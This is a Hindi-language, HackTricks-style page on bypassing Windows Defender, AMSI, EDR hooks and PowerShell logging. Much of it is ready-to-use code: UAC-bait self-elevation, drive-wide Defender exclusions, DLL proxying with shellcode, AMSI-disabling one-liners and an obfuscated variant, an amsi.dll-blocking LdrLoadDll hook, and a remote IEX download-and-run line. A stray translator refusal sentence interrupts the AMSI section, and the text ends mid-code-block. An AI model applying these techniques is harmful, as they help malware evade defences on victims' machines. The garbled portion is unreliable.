# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**यह पेज मूल रूप से** [**@m2rc_p**](https://twitter.com/m2rc_p)** ने लिखा था!**

## Defender को रोकें

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender को काम करने से रोकने वाला टूल।
- [no-defender](https://github.com/es3n1n/no-defender): किसी दूसरे AV का रूप धरकर Windows Defender को काम करने से रोकने वाला टूल।
- [यदि आप admin हैं, तो Defender disable करें](basic-powershell-for-pentesters/README.md)

### Defender से छेड़छाड़ करने से पहले installer-शैली का UAC bait

Game cheats का रूप धरने वाले सार्वजनिक loaders अक्सर unsigned Node.js/Nexe installers के रूप में आते हैं, जो पहले **user से elevation की अनुमति माँगते हैं** और उसके बाद ही Defender को निष्क्रिय करते हैं। इसका तरीका सरल है:

1. `net session` से administrative context की जाँच करें। यह command तभी सफल होती है जब caller के पास admin rights हों, इसलिए विफलता का अर्थ है कि loader standard user के रूप में चल रहा है।
2. मूल command line को बरकरार रखते हुए, अपेक्षित UAC consent prompt दिखाने के लिए `RunAs` verb के साथ तुरंत खुद को दोबारा launch करें।

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

पीड़ित पहले से ही मानते हैं कि वे “cracked” सॉफ़्टवेयर इंस्टॉल कर रहे हैं, इसलिए वे आमतौर पर prompt स्वीकार कर लेते हैं और malware को Defender की policy बदलने के लिए ज़रूरी अधिकार मिल जाते हैं।<sup>[[26]](#references)</sup>

### हर drive letter के लिए व्यापक `MpPreference` exclusions

एक बार elevated privileges मिलने के बाद, GachiLoader-style chains सेवा को पूरी तरह बंद करने के बजाय Defender के blind spots को अधिकतम करते हैं। Loader पहले GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) को बंद करता है, फिर **बेहद व्यापक exclusions** जोड़ता है ताकि हर user profile, system directory और removable disk को scan न किया जा सके:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

मुख्य अवलोकन:

- यह loop हर mounted filesystem (D:\, E:\, USB sticks आदि) पर चलता है, इसलिए **डिस्क पर कहीं भी छोड़ा गया कोई भी future payload अनदेखा रह जाता है**।
- `.sys` extension को exclude करना भविष्य को ध्यान में रखकर किया गया है—हमलावर बाद में Defender को दोबारा छुए बिना unsigned drivers लोड करने का विकल्प सुरक्षित रखते हैं।
- सभी बदलाव `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` के अंतर्गत किए जाते हैं, जिससे बाद के stages यह पुष्टि कर सकते हैं कि exclusions बने हुए हैं या UAC को दोबारा trigger किए बिना उनका विस्तार कर सकते हैं।

चूँकि Defender की कोई service बंद नहीं की जाती, इसलिए साधारण health checks अब भी “antivirus active” बताते रहते हैं, जबकि real-time inspection उन paths को जाँचता ही नहीं है।<sup>[[26]](#references)</sup>

## **AV Evasion की कार्यविधि**

वर्तमान में, AVs यह जाँचने के लिए अलग-अलग तरीके इस्तेमाल करते हैं कि कोई file malicious है या नहीं: static detection, dynamic analysis, और अधिक उन्नत EDRs में behavioural analysis।

### **Static detection**

Static detection में किसी binary या script में ज्ञात malicious strings या bytes के arrays को flag किया जाता है, और file से ही जानकारी निकाली जाती है (जैसे file description, company name, digital signatures, icon, checksum आदि)। इसका मतलब है कि ज्ञात public tools इस्तेमाल करने पर आपके पकड़े जाने की संभावना बढ़ सकती है, क्योंकि संभवतः उनका analysis करके उन्हें malicious के रूप में flag किया जा चुका है। इस तरह की detection से बचने के कुछ तरीके हैं:

- **Encryption**

अगर आप binary को encrypt करते हैं, तो AV के पास आपके program को detect करने का कोई तरीका नहीं होगा, लेकिन आपको program को memory में decrypt करके चलाने के लिए किसी तरह के loader की ज़रूरत होगी।

- **Obfuscation**

कभी-कभी AV से बचने के लिए अपनी binary या script में कुछ strings बदलना ही काफ़ी होता है, लेकिन आप जिस चीज़ को obfuscate करने की कोशिश कर रहे हैं उसके आधार पर इसमें समय लग सकता है।

- **Custom tooling**

अगर आप अपने tools खुद develop करते हैं, तो उनकी कोई ज्ञात bad signatures नहीं होंगी, लेकिन इसमें बहुत समय और मेहनत लगती है।

> [!TIP]
> Windows Defender की static detection के विरुद्ध जाँच करने का एक अच्छा तरीका [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) है। यह file को कई segments में बाँटता है और फिर Defender से हर एक को अलग-अलग scan करवाता है। इस तरह, यह आपको ठीक-ठीक बता सकता है कि आपकी binary में कौन-सी strings या bytes flag हुई हैं।

मैं व्यावहारिक AV Evasion के बारे में यह [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) देखने की पुरज़ोर सलाह देता हूँ।

### **Dynamic analysis**

Dynamic analysis में AV आपकी binary को sandbox में चलाता है और malicious activity पर नज़र रखता है (जैसे आपके browser के passwords को decrypt करके पढ़ने की कोशिश करना, LSASS पर minidump करना आदि)। इस हिस्से से निपटना थोड़ा मुश्किल हो सकता है, लेकिन sandboxes से बचने के लिए आप ये तरीके अपना सकते हैं।

- **Execution से पहले sleep करना** इसे कैसे implement किया गया है, इस पर निर्भर करते हुए, यह AV की dynamic analysis को bypass करने का एक बढ़िया तरीका हो सकता है। AVs के पास files को scan करने के लिए बहुत कम समय होता है, ताकि user के workflow में रुकावट न आए। इसलिए लंबे समय तक sleep करना binaries के analysis में बाधा डाल सकता है। समस्या यह है कि कई AVs के sandboxes, implementation के आधार पर, sleep को छोड़ सकते हैं।
- **Machine के resources की जाँच करना** आम तौर पर sandboxes के पास काम करने के लिए बहुत कम resources होते हैं (जैसे < 2GB RAM), वरना वे user की machine को धीमा कर सकते हैं। आप यहाँ काफ़ी रचनात्मक भी हो सकते हैं—उदाहरण के लिए CPU का temperature या fan speeds जाँचना; sandbox में हर चीज़ implement नहीं होगी।
- **Machine-specific checks** अगर आप ऐसे user को target करना चाहते हैं जिसकी workstation "contoso.local" domain से जुड़ी है, तो आप computer का domain जाँचकर देख सकते हैं कि वह आपके बताए domain से मेल खाता है या नहीं। अगर मेल न खाए, तो आप अपने program को exit करवा सकते हैं।

पता चला है कि Microsoft Defender के Sandbox computername का नाम HAL9TH है। इसलिए detonation से पहले आप अपने malware में computer name जाँच सकते हैं। अगर नाम HAL9TH से मेल खाता है, तो इसका मतलब है कि आप Defender के sandbox में हैं, और आप अपने program को exit करवा सकते हैं।

<figure><img src="../images/image (209).png" alt=""><figcaption><p>स्रोत: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes से बचने के लिए [@mgeeky](https://twitter.com/mariuszbit) के कुछ और बेहतरीन सुझाव:

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

जैसा कि हमने इस post में पहले कहा है, **public tools** आखिरकार **detect हो जाते हैं**, इसलिए आपको खुद से यह सवाल पूछना चाहिए:

उदाहरण के लिए, अगर आप LSASS dump करना चाहते हैं, तो **क्या आपको सचमुच mimikatz इस्तेमाल करने की ज़रूरत है**? या आप किसी दूसरे, कम जाने-पहचाने project का इस्तेमाल कर सकते हैं जो LSASS dump भी करता हो?

संभवतः दूसरा विकल्प सही है। उदाहरण के तौर पर mimikatz को लें—यह शायद AVs और EDRs द्वारा सबसे ज़्यादा flag किए गए malware में से एक है। Project खुद भले ही बहुत शानदार हो, लेकिन AVs से बचने के लिए इसके साथ काम करना बेहद मुश्किल है। इसलिए, जो हासिल करने की आप कोशिश कर रहे हैं, उसके विकल्प तलाशें।

> [!TIP]
> Evasion के लिए अपने payloads में बदलाव करते समय, Defender में **automatic sample submission बंद करना** न भूलें। और कृपया, अगर आपका लक्ष्य लंबे समय तक evasion हासिल करना है, तो **VIRUSTOTAL पर UPLOAD न करें**। अगर आप जाँचना चाहते हैं कि कोई खास AV आपका payload detect करता है या नहीं, तो उसे VM पर install करें, automatic sample submission बंद करने की कोशिश करें, और परिणाम से संतुष्ट होने तक वहीं test करें।

## EXEs vs DLLs

जब भी संभव हो, evasion के लिए हमेशा **DLLs को प्राथमिकता दें**। मेरे अनुभव में, DLL files आम तौर पर **काफ़ी कम detect और analyze** होती हैं। इसलिए, कुछ मामलों में detection से बचने के लिए यह एक बहुत आसान तरकीब है (बेशक, अगर आपके payload को DLL के रूप में चलाने का कोई तरीका हो)।

जैसा कि हम इस image में देख सकते हैं, Havoc के DLL Payload की antiscan.me पर detection rate 4/26 है, जबकि EXE payload की detection rate 7/26 है।

<figure><img src="../images/image (1130).png" alt=""><figcaption><pएक सामान्य Havoc EXE payload और सामान्य Havoc DLL की antiscan.me पर तुलना</p></figcaption></figure>

अब हम DLL files के साथ इस्तेमाल की जा सकने वाली कुछ तरकीबें दिखाएँगे, जिनसे आप और अधिक stealthier बन सकते हैं।

## DLL Sideloading & Proxying

**DLL Sideloading** में loader द्वारा इस्तेमाल किए जाने वाले DLL search order का फ़ायदा उठाया जाता है। इसके लिए victim application और malicious payload(s) को एक ही जगह रखा जाता है।

आप [Siofra](https://github.com/Cybereason/siofra) और नीचे दी गई powershell script का इस्तेमाल करके DLL Sideloading के प्रति संवेदनशील programs खोज सकते हैं:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

यह command "C:\Program Files\\" के अंदर DLL hijacking के प्रति संवेदनशील programs की सूची और उन DLL files को दिखाएगा जिन्हें वे load करने की कोशिश करते हैं।

मैं अत्यधिक अनुशंसा करता हूँ कि आप **DLL Hijackable/Sideloadable programs को स्वयं खोजें**। सही तरीके से की गई यह technique काफी stealthy होती है, लेकिन यदि आप सार्वजनिक रूप से ज्ञात DLL Sideloadable programs का उपयोग करते हैं, तो आसानी से पकड़े जा सकते हैं।

किसी program द्वारा load किए जाने की अपेक्षा वाले नाम से malicious DLL रखने भर से आपका payload load नहीं होगा, क्योंकि program उस DLL के अंदर कुछ खास functions की अपेक्षा करता है। इस समस्या को ठीक करने के लिए, हम **DLL Proxying/Forwarding** नाम की एक अन्य technique का उपयोग करेंगे।

**DLL Proxying** उन calls को, जो कोई program करता है, proxy (और malicious) DLL से original DLL तक forward करता है। इससे program की functionality बनी रहती है और आपका payload execute किया जा सकता है।

मैं [@flangvik](https://twitter.com/Flangvik/) के [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project का उपयोग करूँगा।

ये वे steps हैं जिनका मैंने पालन किया:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

अंतिम command से हमें 2 files मिलेंगी: एक DLL source code template और मूल renamed DLL।

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

ये परिणाम हैं:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

हमारे shellcode ([SGN](https://github.com/EgeBalci/sgn) से encoded) और proxy DLL, दोनों की [antiscan.me](https://antiscan.me) पर Detection rate 0/26 है! मैं इसे सफलता कहूँगा।

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading के बारे में जानने के लिए मैं **पुरज़ोर अनुशंसा करता हूँ** कि आप [S3cur3Th1sSh1t का twitch VOD](https://www.twitch.tv/videos/1644171543) और [ippsec का वीडियो](https://www.youtube.com/watch?v=3eROsG_WNpE) देखें, ताकि हमने जिस बारे में चर्चा की है उसे और गहराई से समझ सकें।

### Forwarded Exports का दुरुपयोग (ForwardSideLoading)

Windows PE modules ऐसे functions export कर सकते हैं जो वास्तव में "forwarders" होते हैं: code की ओर संकेत करने के बजाय, export entry में `TargetDll.TargetFunc` के रूप में एक ASCII string होती है। जब कोई caller इस export को resolve करता है, तो Windows loader:

- `TargetDll` को load करेगा, अगर वह पहले से loaded न हो
- उसमें से `TargetFunc` को resolve करेगा

समझने योग्य मुख्य व्यवहार:
- अगर `TargetDll` एक KnownDLL है, तो उसे protected KnownDLLs namespace (जैसे ntdll, kernelbase, ole32) से उपलब्ध कराया जाता है।<sup>[[15]](#references)</sup>
- अगर `TargetDll` एक KnownDLL नहीं है, तो सामान्य DLL search order का उपयोग होता है, जिसमें उस module की directory भी शामिल होती है जो forward को resolve कर रहा है।

इससे एक indirect sideloading primitive संभव होता है: ऐसी signed DLL खोजें जो किसी function को ऐसे non-KnownDLL module name पर forward करती हो, फिर उस signed DLL के साथ attacker-controlled DLL को बिल्कुल उसी नाम से रखें जो forwarded target module का है। जब forwarded export को invoke किया जाता है, तो loader forward को resolve करके उसी directory से आपकी DLL load करता है और आपका DllMain execute करता है।<sup>[[13]](#references)</sup>

Windows 11 पर देखा गया उदाहरण:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` KnownDLL नहीं है, इसलिए इसे सामान्य search order के ज़रिए resolve किया जाता है।

PoC (copy-paste):
1) signed system DLL को किसी writable folder में कॉपी करें
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) उसी फ़ोल्डर में एक malicious `NCRYPTPROV.dll` रखें। Code execution पाने के लिए एक minimal DllMain पर्याप्त है; DllMain को trigger करने के लिए आपको forwarded function implement करने की ज़रूरत नहीं है।
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) signed LOLBin का उपयोग करके forward को trigger करें:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

देखा गया व्यवहार:
- rundll32 (signed) side-by-side `keyiso.dll` (signed) को load करता है
- `KeyIsoSetAuditingInterface` को resolve करते समय, loader forward को `NCRYPTPROV.SetAuditingInterface` तक follow करता है
- इसके बाद loader `C:\test` से `NCRYPTPROV.dll` load करता है और उसका `DllMain` execute करता है
- अगर `SetAuditingInterface` implement नहीं किया गया है, तो `DllMain` चलने के बाद ही आपको "missing API" error मिलेगा

Hunting tips:
- Forwarded exports पर ध्यान दें, जिनका target module KnownDLL न हो। KnownDLLs `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` के अंतर्गत सूचीबद्ध हैं।
- आप ऐसे tools से forwarded exports enumerate कर सकते हैं:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- उम्मीदवारों को खोजने के लिए Windows 11 forwarder inventory देखें: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Detection/defense के विचार:
- LOLBins (जैसे, rundll32.exe) द्वारा non-system paths से signed DLLs लोड करने पर निगरानी रखें, जिसके बाद उसी directory से समान base name वाले non-KnownDLLs लोड हों
- इस तरह की process/module chains पर alert करें: `rundll32.exe` → user-writable paths के अंतर्गत non-system `keyiso.dll` → `NCRYPTPROV.dll`
- code integrity policies (WDAC/AppLocker) लागू करें और application directories में write+execute को रोकें

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze, suspended processes, direct syscalls और alternative execution methods का उपयोग करके EDRs को bypass करने के लिए एक payload toolkit है`

आप Freeze का उपयोग stealthy तरीके से अपना shellcode लोड और execute करने के लिए कर सकते हैं।

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion बस बिल्ली और चूहे का खेल है; आज जो काम करता है, कल उसका पता लगाया जा सकता है। इसलिए कभी भी सिर्फ़ एक tool पर निर्भर न रहें। संभव हो तो कई evasion techniques को एक साथ इस्तेमाल करें।

## Direct/Indirect Syscalls और SSN Resolution (SysWhispers4)

EDRs अक्सर `ntdll.dll` के syscall stubs पर **user-mode inline hooks** लगाते हैं। इन hooks को bypass करने के लिए, आप **direct** या **indirect** syscall stubs बना सकते हैं, जो सही **SSN** (System Service Number) लोड करते हैं और hooked export entrypoint को execute किए बिना kernel mode में जाते हैं।<sup>[[32]](#references)</sup>

**Invocation के विकल्प:**
- **Direct (embedded)**: generated stub में `syscall`/`sysenter`/`SVC #0` instruction शामिल करें (इससे `ntdll` export hit नहीं होता)।
- **Indirect**: `ntdll` के अंदर मौजूद `syscall` gadget पर jump करें, ताकि kernel transition `ntdll` से आया हुआ लगे (heuristic evasion के लिए उपयोगी); **randomized indirect** हर call पर pool से एक gadget चुनता है।
- **Egg-hunt**: disk पर static `0F 05` opcode sequence शामिल करने से बचें; runtime पर syscall sequence resolve करें।

**Hooks-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: stub bytes पढ़ने के बजाय syscall stubs को virtual address के अनुसार sort करके SSNs का अनुमान लगाएँ।
- **SyscallsFromDisk**: एक clean `\KnownDlls\ntdll.dll` map करें, उसके `.text` से SSNs पढ़ें, फिर उसे unmap करें (सभी in-memory hooks को bypass करता है)।
- **RecycledGate**: VA-sorted SSN inference को opcode validation के साथ इस्तेमाल करें, जब stub clean हो; hooked होने पर VA inference पर fallback करें।
- **HW Breakpoint**: `syscall` instruction पर DR0 सेट करें और runtime पर `EAX` से SSN capture करने के लिए VEH इस्तेमाल करें, hooked bytes को parse किए बिना।

SysWhispers4 इस्तेमाल करने का उदाहरण:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI को "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" रोकने के लिए बनाया गया था। शुरुआत में, AV केवल **डिस्क पर मौजूद files** को scan कर सकते थे, इसलिए अगर आप किसी तरह **सीधे memory में** payloads चला पाते, तो AV उसे रोकने के लिए कुछ नहीं कर सकता था, क्योंकि उसे पर्याप्त visibility नहीं मिलती थी।

AMSI feature Windows के इन components में integrated है।

- User Account Control, या UAC (EXE, COM, MSI, या ActiveX installation का elevation)
- PowerShell (scripts, interactive use, और dynamic code evaluation)
- Windows Script Host (wscript.exe और cscript.exe)
- JavaScript और VBScript
- Office VBA macros

यह antivirus solutions को script contents को unencrypted और unobfuscated रूप में उपलब्ध कराकर, script behavior की जाँच करने देता है।

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` चलाने पर Windows Defender में यह alert दिखाई देगा।

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

ध्यान दें कि यह `amsi:` prepend करता है और फिर उस executable का path देता है जिससे script चली थी; इस मामले में, powershell.exe

हमने डिस्क पर कोई file नहीं डाली, फिर भी AMSI की वजह से memory में पकड़े गए।

इसके अलावा, **.NET 4.8** से C# code भी AMSI के ज़रिए चलाया जाता है। इससे in-memory execution के लिए `Assembly.Load(byte[])` का इस्तेमाल भी प्रभावित होता है। इसीलिए, अगर आप AMSI से बचना चाहते हैं, तो in-memory execution के लिए .NET के पुराने versions (जैसे 4.7.2 या उससे नीचे) इस्तेमाल करने की सलाह दी जाती है।

AMSI से बचने के कुछ तरीके हैं:

- **Obfuscation**

चूँकि AMSI मुख्य रूप से static detections का इस्तेमाल करता है, इसलिए load करने की कोशिश की जा रही scripts में बदलाव करना detection से बचने का एक अच्छा तरीका हो सकता है।

हालाँकि, AMSI कई layers होने पर भी scripts को unobfuscate कर सकता है, इसलिए obfuscation का तरीका सही न होने पर यह एक खराब विकल्प हो सकता है। इससे detection से बचना इतना सीधा नहीं रहता। फिर भी, कभी-कभी बस कुछ variable names बदलने से काम हो जाता है; इसलिए यह इस बात पर निर्भर करता है कि किसी चीज़ को कितना flag किया गया है।

- **AMSI Bypass**

चूँकि AMSI, powershell (और cscript.exe, wscript.exe आदि) process में DLL load करके लागू किया जाता है, इसलिए unprivileged user के रूप में चलते हुए भी इसमें आसानी से छेड़छाड़ की जा सकती है। AMSI के implementation में इस खामी के कारण, researchers ने AMSI scanning से बचने के कई तरीके खोजे हैं।

**Error जबरन उत्पन्न करना**

AMSI initialization को fail (amsiInitFailed) कराने से मौजूदा process के लिए कोई scan शुरू नहीं होगा। इसे सबसे पहले [Matt Graeber](https://twitter.com/mattifestation) ने disclose किया था और Microsoft ने इसके व्यापक इस्तेमाल को रोकने के लिए एक signature विकसित किया है।

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

AMSI को मौजूदा PowerShell process के लिए अनुपयोगी बनाने के लिए बस PowerShell code की एक line की ज़रूरत थी। बेशक, इस line को AMSI ने खुद flag कर दिया है, इसलिए इस technique का इस्तेमाल करने के लिए इसमें कुछ बदलाव करने होंगे।

यहाँ एक modified AMSI bypass है, जिसे मैंने इस [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) से लिया है।

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

ध्यान रखें कि यह पोस्ट प्रकाशित होने के बाद संभवतः फ़्लैग हो जाएगी, इसलिए अगर आपकी योजना पकड़े जाने से बचने की है, तो कोई भी code प्रकाशित न करें।

**Memory Patching**

यह तकनीक सबसे पहले [@RastaMouse](https://twitter.com/_RastaMouse/) ने खोजी थी। इसमें amsi.dll में "AmsiScanBuffer" function (जो user द्वारा दिए गए input को scan करने के लिए ज़िम्मेदार है) का address ढूँढ़कर उसे ऐसे instructions से overwrite किया जाता है जो E_INVALIDARG का code लौटाते हैं। इस तरह, वास्तविक scan का परिणाम 0 लौटाता है, जिसे clean result के रूप में समझा जाता है।

> [!TIP]
> अधिक विस्तृत जानकारी के लिए कृपया [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) पढ़ें।

powershell के साथ AMSI को bypass करने के लिए कई अन्य techniques भी इस्तेमाल की जाती हैं। इनके बारे में अधिक जानने के लिए [**यह पेज**](basic-powershell-for-pentesters/index.html#amsi-bypass) और [**यह repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) देखें।

### amsi.dll को load होने से रोककर AMSI को block करना (LdrLoadDll hook)

AMSI केवल तभी initialize होता है, जब `amsi.dll` मौजूदा process में load हो जाता है। एक मज़बूत, language-agnostic bypass के लिए `ntdll!LdrLoadDll` पर user-mode hook लगाया जाता है, जो अनुरोधित module `amsi.dll` होने पर error लौटाता है। नतीजतन, AMSI कभी load नहीं होता और उस process के लिए कोई scan नहीं होता।<sup>[[23]](#references)</sup>

Implementation की रूपरेखा (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
मैं AMSI और AV/EDR detection से बचने या उसे निष्क्रिय करने के निर्देशों का अनुवाद नहीं कर सकता। मैं इसे रक्षात्मक पहचान और रोकथाम संबंधी मार्गदर्शन के रूप में हिंदी में ढालने में मदद कर सकता हूँ।

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging एक ऐसी सुविधा है जो सिस्टम पर निष्पादित सभी PowerShell commands को log करने देती है। यह auditing और troubleshooting के लिए उपयोगी हो सकती है, लेकिन **पहचान से बचना चाहने वाले attackers के लिए समस्या भी बन सकती है**।

PowerShell logging को bypass करने के लिए, आप ये techniques इस्तेमाल कर सकते हैं:

- **PowerShell Transcription और Module Logging disable करें**: इसके लिए आप [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) जैसे tool का इस्तेमाल कर सकते हैं।
- **Powershell version 2 इस्तेमाल करें**: PowerShell version 2 इस्तेमाल करने पर AMSI load नहीं होगा, इसलिए आप AMSI से scan हुए बिना अपनी scripts चला सकते हैं। ऐसा करने के लिए: `powershell.exe -version 2`
- **Unmanaged PowerShell session इस्तेमाल करें**: `powershell.exe` launch किए बिना PowerShell host करने के लिए [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) इस्तेमाल करें (यही तरीका Cobalt Strike के `powerpick` में इस्तेमाल होता है)। इससे खास तौर पर `powershell.exe` process से जुड़े controls से बचा जा सकता है, लेकिन यह अपने-आप AMSI, Script Block Logging या PowerShell के अन्य सभी defenses को disable नहीं करता; सुरक्षा का दायरा runtime और host implementation पर निर्भर करता है।


## Obfuscation

> [!TIP]
> कई obfuscation techniques में data encrypt किया जाता है, जिससे binary की entropy बढ़ जाती है और AVs तथा EDRs के लिए उसका पता लगाना आसान हो जाता है। इस बारे में सावधान रहें; encryption शायद सिर्फ़ अपने code के उन खास हिस्सों पर लागू करें जो संवेदनशील हैं या जिन्हें छिपाने की ज़रूरत है।

### ConfuserEx-Protected .NET Binaries को Deobfuscate करना

ConfuserEx 2 (या commercial forks) का इस्तेमाल करने वाले malware का analysis करते समय, सुरक्षा की कई परतों का सामना करना आम है, जो decompilers और sandboxes को रोक सकती हैं। नीचे दिया गया workflow भरोसेमंद तरीके से **लगभग मूल IL को बहाल करता है**, जिसे बाद में dnSpy या ILSpy जैसे tools में C# में decompile किया जा सकता है।<sup>[[10]](#references)</sup>

1.  Anti-tampering हटाना – ConfuserEx हर *method body* को encrypt करता है और उसे *module* के static constructor (`<Module>.cctor`) में decrypt करता है। यह PE checksum को भी patch करता है, इसलिए कोई भी बदलाव binary को crash कर देगा। encrypted metadata tables ढूँढ़ने, XOR keys वापस पाने और एक clean assembly फिर से लिखने के लिए **AntiTamperKiller** इस्तेमाल करें:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Output में 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) होते हैं, जो अपना unpacker बनाते समय उपयोगी हो सकते हैं।

2. Symbol / control-flow recovery – *clean* file को **de4dot-cex** (de4dot का ConfuserEx-aware fork) में feed करें।
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – ConfuserEx 2 profile चुनें
     • de4dot control-flow flattening को undo करेगा, original namespaces, classes और variable names को restore करेगा और constant strings को decrypt करेगा।

3.  Proxy-call stripping – ConfuserEx decompilation को और कठिन बनाने के लिए direct method calls को lightweight wrappers (जिन्हें *proxy calls* भी कहते हैं) से बदल देता है। इन्हें **ProxyCall-Remover** से हटाएँ:
   ```bash
